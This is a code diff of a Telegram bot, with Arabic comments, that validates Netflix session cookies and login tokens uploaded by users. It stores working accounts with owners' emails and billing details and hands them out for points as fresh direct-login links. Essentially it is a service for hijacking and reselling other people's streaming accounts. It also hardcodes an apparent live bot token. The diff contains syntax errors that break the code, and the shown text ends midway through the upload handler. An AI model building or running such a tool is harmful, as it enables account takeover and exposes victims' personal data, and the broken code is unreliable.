@@ -25,43 +25,115 @@ apihelper.READ_TIMEOUT = 60
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-# Owner credit
-OWNER_CREDIT = "Huy Vũ - https://huyvu2512.io.vn"
+# Developer & Owner credit
+OWNER_CREDIT = "@farxxes"
+OWNER_LINK = "https://t.me/farxxes"
 
 # إعدادات بوت التليجرام
 BOT_TOKEN = os.environ.get('BOT_TOKEN', '8890151932:AAGHgPOiXAKwA_Z2b6ZAHPbHFrHSmYKJKxM')
 bot = telebot.TeleBot(BOT_TOKEN)
 
+# ضع آيدي الأدمن الخاص بك هنا
+ADMIN_IDS = [123456789] # <--- قم بتغيير الرقم إلى آيدي حسابك الحقيقي
+
 # إعدادات الاشتراك الإجباري لقناتك
 REQUIRED_CHANNEL = os.environ.get('REQUIRED_CHANNEL', '@faresschannel')
 CHANNEL_LINK = os.environ.get('CHANNEL_LINK', 'https://t.me/faresschannel')
 
-# ملف الذاكرة لحفظ الحسابات والإحصائيات
+# ملف الذاكرة لحفظ الحسابات، المستخدمين، والنقاط
 DB_FILE = 'database.json'
 db_lock = threading.Lock()
 
-# قاموس لتتبع عمليات الفحص النشطة لكل مستخدم (لإمكانية إيقافها)
+# قاموس لتتبع عمليات الفحص واللغات
 active_scans = {}
-scan_locks = {}
+user_languages = {} # حفظ لغة المستخدم (ar / en)
+
+# قاموس شامل لأعلام وأسماء معظم دول العالم (عربي / إنجليزي)
+COUNTRY_DATA = {
+    'US': {'ar': '🇺🇸 الولايات المتحدة', 'en': '🇺🇸 United States'},
+    'FR': {'ar': '🇫🇷 فرنسا', 'en': '🇫🇷 France'},
+    'GB': {'ar': '🇬🇧 بريطانيا', 'en': '🇬🇧 United Kingdom'},
+    'CA': {'ar': '🇨🇦 كندا', 'en': '🇨🇦 Canada'},
+    'DE': {'ar': '🇩🇪 ألمانيا', 'en': '🇩🇪 Germany'},
+    'BR': {'ar': '🇧🇷 البرازيل', 'en': '🇧🇷 Brazil'},
+    'ES': {'ar': '🇪🇸 إسبانيا', 'en': '🇪🇸 Spain'},
+    'TR': {'ar': '🇹🇷 تركيا', 'en': '🇹🇷 Turkey'},
+    'AR': {'ar': '🇦🇷 الأرجنتين', 'en': '🇦🇷 Argentina'},
+    'IN': {'ar': '🇮🇳 الهند', 'en': '🇮🇳 India'},
+    'EG': {'ar': '🇪🇬 مصر', 'en': '🇪🇬 Egypt'},
+    'SA': {'ar': '🇸🇦 السعودية', 'en': '🇸🇦 Saudi Arabia'},
+    'AE': {'ar': '🇦🇪 الإمارات', 'en': '🇦🇪 UAE'},
+    'MA': {'ar': '🇲🇦 المغرب', 'en': '🇲🇦 Morocco'},
+    'DZ': {'ar': '🇩🇿 الجزائر', 'en': '🇩🇿 Algeria'},
+    'TN': {'ar': '🇹🇳 تونس', 'en': '🇹🇳 Tunisia'},
+    'IT': {'ar': '🇮🇹 إيطاليا', 'en': '🇮🇹 Italy'},
+    'JP': {'ar': '🇯🇵 اليابان', 'en': '🇯🇵 Japan'},
+    'KR': {'ar': '🇰🇷 كوريا الجنوبية', 'en': '🇰🇷 South Korea'},
+    'MX': {'ar': '🇲🇽 المكسيك', 'en': '🇲🇽 Mexico'},
+    'NL': {'ar': '🇳🇱 هولندا', 'en': '🇳🇱 Netherlands'},
+    'PL': {'ar': '🇵🇱 بولندا', 'en': '🇵🇱 Poland'},
+    'PT': {'ar': '🇵🇹 البرتغال', 'en': '🇵🇹 Portugal'},
+    'RU': {'ar': '🇷🇺 روسيا', 'en': '🇷🇺 Russia'},
+    'SE': {'ar': '🇸🇪 السويد', 'en': '🇸🇪 Sweden'},
+    'CH': {'ar': '🇨🇭 سويسرا', 'en': '🇨🇭 Switzerland'},
+    'BE': {'ar': '🇧🇪 بلجيكا', 'en': '🇧🇪 Belgium'},
+    'CO': {'ar': '🇨🇴 كولومبيا', 'en': '🇨🇴 Colombia'},
+    'CL': {'ar': '🇨🇱 تشيلي', 'en': '🇨🇱 Chile'},
+    'QA': {'ar': '🇶🇦 قطر', 'en': '🇶🇦 Qatar'},
+    'KW': {'ar': '🇰🇼 الكويت', 'en': '🇰🇼 Kuwait'},
+    'IQ': {'ar': '🇮🇶 العراق', 'en': '🇮🇶 Iraq'},
+    'JO': {'ar': '🇯🇴 الأردن', 'en': '🇯🇴 Jordan'},
+    'LB': {'ar': '🇱🇧 لبنان', 'en': '🇱🇧 Lebanon'}
+}
+
+def get_country_name(code, lang='ar'):
+    if not code or code == "Unknown":
+        return "🌍 غير معروف" if lang == 'ar' else "🌍 Unknown"
+    code = code.upper()
+    if code in COUNTRY_DATA:
+        return COUNTRY_DATA[code][lang]
+    return f"🌍 {code}"
 
 def load_db():
     if not os.path.exists(DB_FILE):
-        return {"users": [], "accounts": [], "stats": {"checked": 0, "valid": 0}}
+        return {"users": {}, "accounts": [], "stats": {"checked": 0, "valid": 0}, "redeem_codes": {}}
     try:
         with open(DB_FILE, 'r', encoding='utf-8') as f:
-            return json.load(f)
+            data = json.load(f)
+            if "users" not in data or isinstance(data["users"], list):
+                # تحويل هيكل المستخدمين القديم إلى نظام النقاط
+                old_users = data.get("users", [])
+                data["users"] = {str(uid): {"points": 5, "banned": False} for uid in old_users}
+            if "redeem_codes" not in data:
+                data["redeem_codes"] = {}
+            return data
     except:
-        return {"users": [], "accounts": [], "stats": {"checked": 0, "valid": 0}}
+        return {"users": {}, "accounts": [], "stats": {"checked": 0, "valid": 0}, "redeem_codes": {}}
 
 def save_db(data):
     with db_lock:
         with open(DB_FILE, 'w', encoding='utf-8') as f:
             json.dump(data, f, ensure_ascii=False, indent=4)
 
+def get_user_data(user_id):
+    db = load_db()
+    str_id = str(user_id)
+    if str_id not in db["users"]:
+        db["users"][str_id] = {"points": 5, "banned": False} # 5 نقاط للمستخدم الجديد
+        save_db(db)
+    return db["users"][str_id]
+
+def update_user_points(user_id, amount):
+    db = load_db()
+    str_id = str(user_id)
+    if str_id in db["users"]:
+        db["users"][str_id]["points"] += amount
+        save_db(db)
+
 def add_account_to_db(account_info):
     db = load_db()
     netflix_id = account_info['cookie'].get('NetflixId')
-    exists = any(acc['cookie'].get('NetflixId') == netflix_id or (acc.get('email') != 'Unknown' and acc.get('email') == account_info.get('email')) for acc in db['accounts'])
+    exists = any(acc['cookie'].get('NetflixId') == netflix_id or (acc.get('email') != 'Unknown' and acc.get('email'] == account_info.get('email')) for acc in db['accounts'])
     if not exists:
         db['accounts'].append(account_info)
         db['stats']['valid'] = len(db['accounts'])
@@ -101,19 +173,24 @@ def format_billing_date(raw):
             return raw
 
 def extract_netflix_id(content):
+    # فحص إذا كان المُدخل عبارة عن رابط توكن مباشر (Token Checker)
+    token_match = re.search(r'nftoken=([^\s&]+)', content)
+    if token_match:
+        return {"type": "token", "value": token_match.group(1)}
+
     try:
         data = json.loads(content)
         if isinstance(data, list):
             for cookie in data:
                 if cookie.get("name") == "NetflixId":
-                    return cookie.get("value")
+                    return {"type": "cookie", "value": cookie.get("value")}
         elif isinstance(data, dict):
             if "NetflixId" in data:
-                return data["NetflixId"]
+                return {"type": "cookie", "value": data["NetflixId"]}
             elif "cookies" in data:
                 for cookie in data["cookies"]:
                     if cookie.get("name") == "NetflixId":
-                        return cookie.get("value")
+                        return {"type": "cookie", "value": cookie.get("value")}
     except:
         pass
     
@@ -125,7 +202,7 @@ def extract_netflix_id(content):
                 netflix_id = urllib.parse.unquote(netflix_id)
             except:
                 pass
-        return netflix_id
+        return {"type": "cookie", "value": netflix_id}
     
     netscape_match = re.search(r'\.netflix\.com\s+TRUE\s+/\s+TRUE\s+\d+\s+NetflixId\s+([^\s]+)', content)
     if netscape_match:
@@ -135,7 +212,7 @@ def extract_netflix_id(content):
                 netflix_id = urllib.parse.unquote(netflix_id)
             except:
                 pass
-        return netflix_id
+        return {"type": "cookie", "value": netflix_id}
     
     plain_match = re.search(r'NetflixId[=:\s]+([^\s;,\n]+)', content, re.IGNORECASE)
     if plain_match:
@@ -145,7 +222,7 @@ def extract_netflix_id(content):
                 netflix_id = urllib.parse.unquote(netflix_id)
             except:
                 pass
-        return netflix_id
+        return {"type": "cookie", "value": netflix_id}
     
     return None
 
@@ -198,15 +275,7 @@ def check_netflix_cookie(cookie_dict):
         plan_price = unescape_plan(plan_price) if plan_price else "Unknown"
 
         member_since = find(r'"memberSince":"([^"]+)"')
-        member_since = unescape_plan(member_since) if member_since else "Unknown"
-
-        payment_method = find(r'"paymentMethod"[^}]+"value":"([^"]+)"') or "Unknown"
-
-        phone = find(r'"phoneNumberDigits"[^}]+"value":"([^"]+)"')
-        phone = phone.replace("\\x2B", "+") if phone else "Unknown"
-
-        phone_verified_match = re.search(r'"growthPhoneNumber"[^}]+"isVerified":(true|false)', txt)
-        phone_verified = "Yes" if phone_verified_match and phone_verified_match.group(1) == 'true' else "No"
+        member_since = format_billing_date(unescape_plan(member_since)) if member_since else "Unknown"
 
         video_quality = find(r'"videoQuality"[^}]+"value":"([^"]+)"') or "Unknown"
         max_streams = find(r'"maxStreams"[^}]+"value":(\d+)') or "Unknown"
@@ -214,18 +283,13 @@ def check_netflix_cookie(cookie_dict):
         payment_hold_match = re.search(r'"growthHoldMetadata"[^}]+"isUserOnHold":(true|false)', txt)
         payment_hold = "Yes" if payment_hold_match and payment_hold_match.group(1) == 'true' else "No"
 
-        extra_member_match = re.search(r'"showExtraMemberSection"[^}]+"value":(true|false)', txt)
-        extra_member = "Yes" if extra_member_match and extra_member_match.group(1) == 'true' else "No"
-
-        email_verified = "Yes" if re.search(r'"emailVerified"\s*:\s*true', txt) else "No"
-        
         country = find(r'"countryOfSignup"\s*:\s*"([^"]+)"') or find(r'"countryCode"\s*:\s*"([^"]+)"') or "Unknown"
         
         email = find(r'"emailAddress"\s*:\s*"([^"]+)"') or "Unknown"
         if email != "Unknown":
             email = urllib.parse.unquote(email)
         
-        next_billing = extract_next_billing_date(txt)
+        next_billing = format_billing_date(extract_next_billing_date(txt))
 
         profiles = []
         try:
@@ -253,17 +317,12 @@ def check_netflix_cookie(cookie_dict):
             'plan': plan,
             'plan_price': plan_price,
             'member_since': member_since,
-            'payment_method': payment_method,
-            'phone': phone,
-            'phone_verified': phone_verified,
             'video_quality': video_quality,
             'max_streams': max_streams,
             'on_payment_hold': payment_hold,
-            'extra_member': extra_member,
-            'email_verified': email_verified,
             'email': email,
             'profiles': profiles_str,
-            'next_billing': format_billing_date(next_billing),
+            'next_billing': next_billing,
             'cookie': cookie_dict
         }
     except Exception as e:
@@ -365,134 +424,361 @@ def extract_zip_and_get_files(zip_path, extract_dir):
         logger.error(f"Error extracting ZIP file: {e}")
         return []
 
-def send_sub_required_message(message):
+def send_sub_required_message(message, lang='ar'):
     markup = InlineKeyboardMarkup()
-    markup.add(InlineKeyboardButton("📢 اشترك في القناة هنا", url=CHANNEL_LINK))
-    markup.add(InlineKeyboardButton("🔄 تحقق من الاشتراك", callback_data="check_sub"))
-    bot.reply_to(message, "⚠️ **عذراً، يجب عليك الاشتراك في قناة البوت أولاً لتتمكن من استخدامه!**\n\nبعد الاشتراك، اضغط على زر التحقق أدناه.", reply_markup=markup, parse_mode='Markdown')
+    if lang == 'en':
+        markup.add(InlineKeyboardButton("📢 Subscribe to Channel", url=CHANNEL_LINK))
+        markup.add(InlineKeyboardButton("🔄 Verify Subscription", callback_data="check_sub"))
+        bot.reply_to(message, "⚠️ **Sorry, you must subscribe to the bot's channel first to use it!**\n\nAfter subscribing, click the verify button below.", reply_markup=markup, parse_mode='Markdown')
+    else:
+        markup.add(InlineKeyboardButton("📢 اشترك في القناة هنا", url=CHANNEL_LINK))
+        markup.add(InlineKeyboardButton("🔄 تحقق من الاشتراك", callback_data="check_sub"))
+        bot.reply_to(message, "⚠️ **عذراً، يجب عليك الاشتراك في قناة البوت أولاً لتتمكن من استخدامه!**\n\nبعد الاشتراك، اضغط على زر التحقق أدناه.", reply_markup=markup, parse_mode='Markdown')
 
 @bot.message_handler(commands=['start', 'help'])
 def send_welcome(message):
     user_id = message.from_user.id
-    if not check_subscription(user_id):
-        send_sub_required_message(message)
+    user_data = get_user_data(user_id)
+    if user_data.get("banned", False):
+        bot.reply_to(message, "❌ You are banned from using this bot." if user_languages.get(user_id) == 'en' else "❌ أنت محظور من استخدام هذا البوت.")
         return
-        
-    db = load_db()
-    if user_id not in db["users"]:
-        db["users"].append(user_id)
-        save_db(db)
 
-    welcome_text = (
-        "🎬 **أهلاً بك في بوت فحص كوكيز Netflix الشامل والمطور!**\n\n"
-        "🔹 أرسل لي نص الكوكي، أو ارفع ملف `.txt` أو ملف مضغوط `.zip` وسأقوم بفحصه بدقة واستقرار.\n"
-        "🔹 يتم حفظ الحسابات الصالحة تلقائياً في ذاكرة البوت مع روابط دخول طازجة عند السحب.\n\n"
-        "📋 **الأوامر المتاحة:**\n"
-        "▪️ `/pull` أو `/getaccount` - لسحب حساب شغال وذو رابط طازج من الذاكرة.\n"
-        "▪️ `/stats` - لعرض إحصائيات البوت والحسابات المخزنة.\n"
+    markup = InlineKeyboardMarkup(row_width=2)
+    markup.add(
+        InlineKeyboardButton("🇸🇦 العربية", callback_data="lang_ar"),
+        InlineKeyboardButton("🇬🇧 English", callback_data="lang_en")
     )
-    bot.reply_to(message, welcome_text, parse_mode='Markdown')
+    bot.reply_to(message, "🌐 **Please choose your language / يرجى اختيار لغتك:**", reply_markup=markup, parse_mode='Markdown')
 
-@bot.message_handler(commands=['stats'])
-def bot_stats(message):
-    user_id = message.from_user.id
+def show_main_menu(chat_id, user_id):
     if not check_subscription(user_id):
-        send_sub_required_message(message)
+        lang = user_languages.get(user_id, 'ar')
+        class FakeMsg:
+            def __init__(self, cid):
+                self.chat = type('obj', (object,), {'id': cid})
+        send_sub_required_message(FakeMsg(chat_id), lang)
+        return
+
+    user_data = get_user_data(user_id)
+    if user_data.get("banned", False):
+        return
+
+    lang = user_languages.get(user_id, 'ar')
+    points = user_data["points"]
+    
+    if lang == 'en':
+        welcome_text = (
+            f"🎬 **Welcome to the Advanced Netflix Cookie Checker Bot!**\n\n"
+            f"💰 Your Points: `{points}` 🪙\n"
+            "🔹 Send cookie text or token link, or upload a `.txt` / `.zip` file.\n"
+            "🔹 Checking is FREE! Pulling accounts costs 1 point.\n"
+            f"👨‍💻 **Developer:** `{OWNER_CREDIT}`\n\n"
+            "👇 **Choose an option below:**"
+        )
+        markup = InlineKeyboardMarkup(row_width=2)
+        markup.add(
+            InlineKeyboardButton("🎟️ Pull Fresh Account (1 Point)", callback_data="btn_pull"),
+            InlineKeyboardButton("💳 Recharge Points", callback_data="btn_recharge"),
+            InlineKeyboardButton("📢 Bot Channel", url=CHANNEL_LINK)
+        )
+        if user_id in ADMIN_IDS:
+            markup.add(InlineKeyboardButton("📊 Admin Panel", callback_data="btn_admin"))
+    else:
+        welcome_text = (
+            f"🎬 **أهلاً بك في بوت فحص كوكيز Netflix الشامل والمطور!**\n\n"
+            f"💰 رصيدك الحالي: `{points}` نقطة 🪙\n"
+            "🔹 فحص الملفات والكوكيز (مجاني تماماً!).\n"
+            "🔹 سحب حساب من الذاكرة يكلف (نقطة واحدة).\n"
+            f"👨‍💻 **المطور:** `{OWNER_CREDIT}`\n\n"
+            "👇 **اختر ما تحتاجه من الأزرار أدناه:**"
+        )
+        markup = InlineKeyboardMarkup(row_width=2)
+        markup.add(
+            InlineKeyboardButton("🎟️ سحب حساب طازج (نقطة واحدة)", callback_data="btn_pull"),
+            InlineKeyboardButton("💳 شحن النقاط", callback_data="btn_recharge"),
+            InlineKeyboardButton("📢 قناة البوت", url=CHANNEL_LINK)
+        )
+        if user_id in ADMIN_IDS:
+            markup.add(InlineKeyboardButton("📊 لوحة الأدمن", callback_data="btn_admin"))
+
+    bot.send_message(chat_id, welcome_text, reply_markup=markup, parse_mode='Markdown')
+
+@bot.message_handler(commands=['stats', 'admin'])
+def admin_panel_command(message):
+    user_id = message.from_user.id
+    lang = user_languages.get(user_id, 'ar')
+    
+    if user_id not in ADMIN_IDS:
+        bot.reply_to(message, "❌ This command is for the admin only!" if lang == 'en' else "❌ هذا الأمر مخصص لمدير البوت فقط!")
         return
 
     db = load_db()
-    total_users = len(db.get("users", []))
+    total_users = len(db.get("users", {}))
     total_valid = len(db.get("accounts", []))
     total_checked = db.get("stats", {}).get("checked", 0)
 
     stats_msg = (
-        "📊 **إحصائيات بوت Netflix:**\n\n"
-        f"👥 عدد المستخدمين: `{total_users}`\n"
-        f"🔍 إجمالي الحسابات المفحوصة: `{total_checked}`\n"
-        f"💾 الحسابات الشغالة المخزنة في الذاكرة: `{total_valid}`\n"
+        "📊 **Admin Control Panel:**\n\n"
+        f"👥 Total Users: `{total_users}`\n"
+        f"🔍 Total Checked: `{total_checked}`\n"
+        f"💾 Working Accounts in Memory: `{total_valid}`\n"
+        f"👨‍💻 Developer: `{OWNER_CREDIT}`\n\n"
+        "💡 *Admin Commands:* \n"
+        "`/addpoints [user_id] [amount]` - إضافة نقاط\n"
+        "`/ban [user_id]` - حظر مستخدم\n"
+        "`/unban [user_id]` - رفع الحظر\n"
+        "`/genkey [points]` - إنشاء كود شحن"
     )
     bot.reply_to(message, stats_msg, parse_mode='Markdown')
 
-@bot.message_handler(commands=['pull', 'getaccount'])
-def pull_account(message):
-    user_id = message.from_user.id
+@bot.message_handler(commands=['addpoints'])
+def cmd_addpoints(message):
+    if message.from_user.id not in ADMIN_IDS:
+        return
+    try:
+        parts = message.text.split()
+        target_id = parts[1]
+        amount = int(parts[2])
+        update_user_points(target_id, amount)
+        bot.reply_to(message, f"✅ Successfully added {amount} points to user {target_id}.")
+    except:
+        bot.reply_to(message, "❌ Usage: `/addpoints [user_id] [amount]`", parse_mode='Markdown')
+
+@bot.message_handler(commands=['genkey'])
+def cmd_genkey(message):
+    if message.from_user.id not in ADMIN_IDS:
+        return
+    try:
+        parts = message.text.split()
+        amount = int(parts[1])
+        key = f"NETFLIX-{uuid.uuid4().hex[:8].upper()}"
+        db = load_db()
+        db["redeem_codes"][key] = amount
+        save_db(db)
+        bot.reply_to(message, f"✅ Redeem code created successfully:\n`{key}`\nPoints: {amount}", parse_mode='Markdown')
+    except:
+        bot.reply_to(message, "❌ Usage: `/genkey [points]`", parse_mode='Markdown')
+
+@bot.message_handler(commands=['ban'])
+def cmd_ban(message):
+    if message.from_user.id not in ADMIN_IDS:
+        return
+    try:
+        target_id = message.text.split()[1]
+        db = load_db()
+        if target_id in db["users"]:
+            db["users"][target_id]["banned"] = True
+            save_db(db)
+            bot.reply_to(message, f"✅ User {target_id} has been banned.")
+    except:
+        bot.reply_to(message, "❌ Usage: `/ban [user_id]`")
+
+def execute_pull_account(chat_id, user_id):
+    lang = user_languages.get(user_id, 'ar')
     if not check_subscription(user_id):
-        send_sub_required_message(message)
+        class FakeMsg:
+            def __init__(self, cid):
+                self.chat = type('obj', (object,), {'id': cid})
+        send_sub_required_message(FakeMsg(chat_id), lang)
+        return
+
+    user_data = get_user_data(user_id)
+    if user_data["points"] < 1:
+        msg = "❌ You don't have enough points! You need at least 1 point to pull an account. Recharge your points using the button below." if lang == 'en' else "❌ رصيدك غير كافٍ! تحتاج إلى نقطة واحدة على الأقل لسحب حساب. يمكنك شحن نقاطك عبر زر الشحن."
+        bot.send_message(chat_id, msg)
         return
 
     db = load_db()
     accounts = db.get("accounts", [])
     
     if not accounts:
-        bot.reply_to(message, "❌ عذراً، الذاكرة فارغة حالياً ولا توجد حسابات شغالة مخزنة. قم بفحص بعض الملفات أولاً!")
+        err_msg = "❌ Sorry, memory is currently empty. Scan some files first!" if lang == 'en' else "❌ عذراً، الذاكرة فارغة حالياً ولا توجد حسابات شغالة مخزنة. قم بفحص بعض الملفات أولاً!"
+        bot.send_message(chat_id, err_msg)
         return
+
+    # خصم نقطة واحدة عند سحب الحساب
+    update_user_points(user_id, -1)
 
     acc = accounts.pop(0)
     db["accounts"] = accounts
     save_db(db)
 
-    msg_wait = bot.reply_to(message, "⏳ جاري سحب الحساب وتوليد رابط دخول طازج وفعال...")
+    wait_text = "⏳ Pulling account and generating fresh direct login link..." if lang == 'en' else "⏳ جاري سحب الحساب وتوليد رابط دخول طازج وفعال..."
+    msg_wait = bot.send_message(chat_id, wait_text)
 
     netflix_id = acc['cookie'].get('NetflixId')
     token_result = generate_token(netflix_id)
 
-    res_msg = "🎬 **حساب NETFLIX مسحوب من الذاكرة (برابط طازج)** 🎬\n\n"
-    res_msg += f"🌍 البلد: `{acc['country']}`\n"
-    res_msg += f"📦 الباقة: `{acc['plan']}`\n"
-    res_msg += f"💰 السعر: `{acc['plan_price']}`\n"
-    res_msg += f"📅 التجديد: `{acc['next_billing']}`\n"
-    res_msg += f"👥 الملفات: `{acc['profiles']}`\n"
-    res_msg += f"📧 البريد: `{acc['email'].replace(chr(92) + 'x40', '@')}`\n"
-    
-    if token_result.get('status') == 'Success':
-        mobile_url = token_result.get('direct_login_url', f"https://netflix.com/unsupported?nftoken={token_result['token']}")
-        res_msg += f"\n📱 **رابط الدخول المباشر (طازج):**\n`{mobile_url}`"
-    else:
-        res_msg += f"\n⚠️ **فشل توليد رابط طازج (قد يكون الكوكي انتهى تماماً).**"
-    
-    try:
-        bot.edit_message_text(res_msg, message.chat.id, msg_wait.message_id, parse_mode='Markdown')
-    except:
-        bot.send_message(message.chat.id, res_msg, parse_mode='Markdown')
+    country_full = get_country_name(acc['country'], lang)
+    email = acc['email'].replace(chr(92) + 'x40', '@')
+    hold_status = "⚠️ On Hold" if acc['on_payment_hold'] == 'Yes' else ("✅ Active" if lang == 'en' else "✅ نشط تماماً")
 
-@bot.callback_query_handler(func=lambda call: call.data in ["check_sub", "stop_scan"])
+    if lang == 'en':
+        res_msg = "🎬 **NETFLIX Account Pulled from Memory (Fresh Link)** 🎬\n\n"
+        res_msg += f"🌍 Country: `{country_full}`\n"
+        res_msg += f"📦 Plan: `{acc['plan']}`\n"
+        res_msg += f"💰 Price: `{acc['plan_price']}`\n"
+        res_msg += f"📺 Quality: `{acc['video_quality']}` | Streams: `{acc['max_streams']}`\n"
+        res_msg += f"💳 Status: `{hold_status}`\n"
+        res_msg += f"📅 Member Since: `{acc['member_since']}`\n"
+        res_msg += f"🔄 Next Billing: `{acc['next_billing']}`\n"
+        res_msg += f"👥 Profiles: `{acc['profiles']}`\n"
+        res_msg += f"📧 Email: `{email}`\n"
+        
+        if token_result.get('status'] == 'Success':
+            mobile_url = token_result.get('direct_login_url', f"https://netflix.com/unsupported?nftoken={token_result['token']}")
+            res_msg += f"\n📱 **Direct Login URL (Fresh):**\n`{mobile_url}`"
+        else:
+            res_msg += f"\n⚠️ **Failed to generate fresh link (Cookie might have expired).**"
+        
+        res_msg += f"\n\n👨‍💻 **Developer:** `{OWNER_CREDIT}`"
+    else:
+        res_msg = "🎬 **حساب NETFLIX مسحوب من الذاكرة (برابط طازج)** 🎬\n\n"
+        res_msg += f"🌍 البلد: `{country_full}`\n"
+        res_msg += f"📦 الباقة: `{acc['plan']}`\n"
+        res_msg += f"💰 السعر: `{acc['plan_price']}`\n"
+        res_msg += f"📺 الجودة: `{acc['video_quality']}` | الشاشات: `{acc['max_streams']}`\n"
+        res_msg += f"💳 حالة الحساب: `{hold_status}`\n"
+        res_msg += f"📅 تاريخ الاشتراك (أول مرة): `{acc['member_since']}`\n"
+        res_msg += f"🔄 تاريخ التجديد: `{acc['next_billing']}`\n"
+        res_msg += f"👥 البروفايلات: `{acc['profiles']}`\n"
+        res_msg += f"📧 البريد: `{email}`\n"
+        
+        if token_result.get('status'] == 'Success':
+            mobile_url = token_result.get('direct_login_url', f"https://netflix.com/unsupported?nftoken={token_result['token']}")
+            res_msg += f"\n📱 **رابط الدخول المباشر (طازج):**\n`{mobile_url}`"
+        else:
+            res_msg += f"\n⚠️ **فشل توليد رابط طازج (قد يكون الكوكي انتهى تماماً).**"
+        
+        res_msg += f"\n\n👨‍💻 **المطور:** `{OWNER_CREDIT}`"
+
+    try:
+        bot.edit_message_text(res_msg, chat_id, msg_wait.message_id, parse_mode='Markdown')
+    except:
+        bot.send_message(chat_id, res_msg, parse_mode='Markdown')
+
+@bot.message_handler(commands=['pull', 'getaccount'])
+def pull_account_command(message):
+    execute_pull_account(message.chat.id, message.from_user.id)
+
+@bot.message_handler(func=lambda message: message.text and message.text.startswith("NETFLIX-"))
+def redeem_key_handler(message):
+    user_id = message.from_user.id
+    lang = user_languages.get(user_id, 'ar')
+    key = message.text.strip()
+    
+    db = load_db()
+    if key in db["redeem_codes"]:
+        points = db["redeem_codes"][key]
+        del db["redeem_codes"][key]
+        save_db(db)
+        update_user_points(user_id, points)
+        bot.reply_to(message, f"✅ Congratulations! You have successfully redeemed {points} points." if lang == 'en' else f"✅ مبروك! تم شحن {points} نقطة بنجاح إلى حسابك.")
+    else:
+        bot.reply_to(message, "❌ Invalid or already used redeem code." if lang == 'en' else "❌ كود الشحن غير صالح أو تم استخدامه مسبقاً.")
+
+@bot.callback_query_handler(func=lambda call: True)
 def callback_queries(call):
     user_id = call.from_user.id
-    if call.data == "check_sub":
+    data = call.data
+    
+    if data.startswith("lang_"):
+        lang = data.split("_")[1]
+        user_languages[user_id] = lang
+        msg_resp = "✅ Language set to English!" if lang == 'en' else "✅ تم اختيار اللغة العربية بنجاح!"
+        bot.answer_callback_query(call.id, msg_resp)
+        try:
+            bot.delete_message(call.message.chat.id, call.message.message_id)
+        except:
+            pass
+        show_main_menu(call.message.chat.id, user_id)
+        
+    elif data == "check_sub":
+        lang = user_languages.get(user_id, 'ar')
         if check_subscription(user_id):
-            bot.answer_callback_query(call.id, "✅ تم التحقق من اشتراكك بنجاح!")
+            bot.answer_callback_query(call.id, "✅ Subscription verified successfully!" if lang == 'en' else "✅ تم التحقق من اشتراكك بنجاح!")
             try:
                 bot.delete_message(call.message.chat.id, call.message.message_id)
             except:
                 pass
-            send_welcome(call.message)
+            show_main_menu(call.message.chat.id, user_id)
         else:
-            bot.answer_callback_query(call.id, "❌ لم تقم بالاشتراك في القناة بعد!", show_alert=True)
+            bot.answer_callback_query(call.id, "❌ You haven't subscribed to the channel yet!" if lang == 'en' else "❌ لم تقم بالاشتراك في القناة بعد!", show_alert=True)
             
-    elif call.data == "stop_scan":
+    elif data == "stop_scan":
+        lang = user_languages.get(user_id, 'ar')
         if user_id in active_scans:
-            active_scans[user_id].set() # إرسال إشارة إيقاف للفحص
-            bot.answer_callback_query(call.id, "🛑 جاري إيقاف عملية الفحص...")
+            active_scans[user_id].set()
+            bot.answer_callback_query(call.id, "🛑 Stopping scan..." if lang == 'en' else "🛑 جاري إيقاف عملية الفحص...")
         else:
-            bot.answer_callback_query(call.id, "⚠️ لا توجد عملية فحص نشطة حالياً.")
+            bot.answer_callback_query(call.id, "⚠️ No active scan found." if lang == 'en' else "⚠️ لا توجد عملية فحص نشطة حالياً.")
+            
+    elif data == "btn_pull":
+        bot.answer_callback_query(call.id)
+        execute_pull_account(call.message.chat.id, user_id)
+
+    elif data == "btn_recharge":
+        lang = user_languages.get(user_id, 'ar')
+        bot.answer_callback_query(call.id)
+        ref_link = f"https://t.me/{bot.get_me().username}?start=ref_{user_id}"
+        msg = (
+            f"💳 **Recharge Points:**\n\n"
+            f"1️⃣ Send your recharge code (e.g., `NETFLIX-XXXX`) directly in chat.\n"
+            f"2️⃣ Invite friends using your referral link to earn points:\n`{ref_link}`"
+        ) if lang == 'en' else (
+            f"💳 **طريقة شحن النقاط:**\n\n"
+            f"1️⃣ أرسل كود الشحن (مثال: `NETFLIX-XXXX`) مباشرة هنا في الشات.\n"
+            f"2️⃣ قم بدعوة أصدقائك عبر رابط الدعوة الخاص بك لكسب نقاط مجانية:\n`{ref_link}`"
+        )
+        bot.send_message(call.message.chat.id, msg, parse_mode='Markdown')
+        
+    elif data == "btn_admin":
+        lang = user_languages.get(user_id, 'ar')
+        if user_id not in ADMIN_IDS:
+            bot.answer_callback_query(call.id, "❌ Admin only!" if lang == 'en' else "❌ مخصص للأدمن فقط!", show_alert=True)
+            return
+        bot.answer_callback_query(call.id)
+        db = load_db()
+        total_users = len(db.get("users", {}))
+        total_valid = len(db.get("accounts", []))
+        total_checked = db.get("stats", {}).get("checked", 0)
+
+        stats_msg = (
+            "📊 **Admin Statistics Dashboard:**\n\n"
+            f"👥 Total Users: `{total_users}`\n"
+            f"🔍 Total Checked Accounts: `{total_checked}`\n"
+            f"💾 Working Accounts in Memory: `{total_valid}`\n"
+            f"👨‍💻 Developer: `{OWNER_CREDIT}`\n"
+        ) if lang == 'en' else (
+            "📊 **لوحة إحصائيات الأدمن:**\n\n"
+            f"👥 إجمالي المستخدمين: `{total_users}`\n"
+            f"🔍 إجمالي الحسابات المفحوصة: `{total_checked}`\n"
+            f"💾 الحسابات الشغالة في الذاكرة: `{total_valid}`\n"
+            f"👨‍💻 المطور: `{OWNER_CREDIT}`\n"
+        )
+        bot.send_message(call.message.chat.id, stats_msg, parse_mode='Markdown')
 
 @bot.message_handler(content_types=['document'])
 def handle_documents(message):
     user_id = message.from_user.id
+    lang = user_languages.get(user_id, 'ar')
+    
     if not check_subscription(user_id):
-        send_sub_required_message(message)
+        send_sub_required_message(message, lang)
         return
 
-    # إنشاء حدث إيقاف خاص بهذا المستخدم
     stop_event = threading.Event()
     active_scans[user_id] = stop_event
 
     temp_dirs = []
     try:
         markup = InlineKeyboardMarkup()
-        markup.add(InlineKeyboardButton("🛑 إيقاف الفحص", callback_data="stop_scan"))
+        stop_btn_text = "🛑 Stop Scan" if lang == 'en' else "🛑 إيقاف الفحص"
+        markup.add(InlineKeyboardButton(stop_btn_text, callback_data="stop_scan"))
         
-        msg_wait = bot.reply_to(message, "⏳ جاري تحميل الملف وبدء الفحص المستقر...", reply_markup=markup)
